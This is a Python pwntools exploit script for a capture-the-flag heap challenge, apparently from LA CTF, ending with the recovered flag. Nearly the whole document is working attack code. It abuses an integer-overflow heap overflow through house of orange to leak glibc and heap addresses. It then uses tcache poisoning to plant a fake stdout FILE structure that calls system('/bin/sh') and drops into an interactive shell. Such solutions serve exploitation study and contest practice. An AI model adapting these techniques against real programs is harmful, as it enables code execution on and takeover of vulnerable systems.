from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./chall_patched')
gdb.attach(p, '''
    continue
''')

# p = remote('chall.lac.tf', 31144)

# malloc a chunk at index (unused, 0/1) of size (0-0xf8) with data (given size minus 8 at most, null terminated)
def create_note(index, size, data):
    p.sendlineafter(b"Choice > ", str(1).encode())
    p.sendlineafter(b"Index: ", index)
    p.sendlineafter(b"Size: ", str(size).encode())
    p.sendafter(b"Data: ", data)  # read_data_into_note (integer overflow available if given size is within 0-7) could trigger heap buffer overflow

# free a chunk at index (used, 0/1) and null its pointer
def delete_note(index):
    p.sendlineafter(b"Choice > ", str(2).encode())
    p.sendlineafter(b"Index: ", str(index).encode())

# print out string data of chunk at index (used, 0/1)
def print_note(index):
    p.sendlineafter(b"Choice > ", str(3).encode())
    p.sendlineafter(b"Index: ", str(index).encode())
    return p.recvline().rstrip()

# overall two chunks can be controlled at the same time

glibc_e = ELF('./libc.so.6')

# Stage 1: house of orange to leak glibc base address and heap base address
# heap buffer overflow through integer overflow
create_note(b'0', 0, b'A'*0x18+p64(0xd50))  # heap_base_addr+0x2a0
# now size of top chunk (heap_base_addr+0x2c0) is changed from 0x20d50 to 0xd50
delete_note(0)  # heap_base_addr+0x2a0
# now tcache bin of size 0x20: heap_base_addr+0x2a0
# trigger house of orange by leveraging scanf's behavior to free top chunk (heap_base_addr+0x2c0) into unsorted bin
create_note(b'0'*0x1000, 0xf8, b'A'*8)  # heap_base_addr+0x2c0
# now unsorted bin has a chunk of size 0xc30: heap_base_addr+0x3c0
glibc_base_addr = u64(print_note(0)[-6:].ljust(8, b'\x00'))-0x21b2e0
log.info(f"glibc base address: {hex(glibc_base_addr)}")
delete_note(0)  # heap_base_addr+0x2c0
# now tcache bin of size 0x100: heap_base_addr+0x2c0
create_note(b'0', 0xf8, b'A'*0x10)  # heap_base_addr+0x2c0
heap_base_addr = u64(print_note(0)[-6:].ljust(8, b'\x00'))-0x2b0
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: tcache poisoning to fsop
create_note(b'1', 0xf8, b'A')  # heap_base_addr+0x3c0
delete_note(1)  # heap_base_addr+0x3c0
delete_note(0)  # heap_base_addr+0x2c0
# now tcache bin of size 0x100: heap_base_addr+0x2c0 -> heap_base_addr+0x3c0
# heap buffer overflow through integer overflow, perform tcache poisoning
create_note(b'0', 0, b'A'*0x18+p64(0x101)+p64(((heap_base_addr+0x2c0)>>12)^(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])))  # heap_base_addr+0x2a0
# now tcache bin of size 0x100: heap_base_addr+0x2c0 -> glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']
delete_note(0)  # heap_base_addr+0x2a0
# now tcache bin of size 0x20: heap_base_addr+0x2a0
create_note(b'0', 0xf8, b'A')  # heap_base_addr+0x2c0
# overwrite stdout to trigger fsop
fake_file = FileStructure(0)
fake_file.flags = 0x3b01010101010101
fake_file._IO_read_end = glibc_base_addr+glibc_e.sym.system
fake_file._IO_buf_base = u64(b'/bin/sh\x00')
fake_file._IO_backup_base = glibc_base_addr+next(glibc_e.search(asm('add rdi, 0x10; jmp rcx;')))
fake_file._lock = glibc_base_addr+glibc_e.symbols['_IO_stdfile_1_lock']
fake_file._codecvt = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0xb8
fake_file._wide_data = glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x200
fake_file.unknown2 = p64(0)*2+p64(glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']+0x28)+p64(0)*3
fake_file.vtable = glibc_base_addr+glibc_e.symbols['_IO_wfile_jumps']-0x18
create_note(b'1', 0xf8, bytes(fake_file))  # glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_']

p.interactive()

# lactf{omg_arb_overflow_is_so_powerful}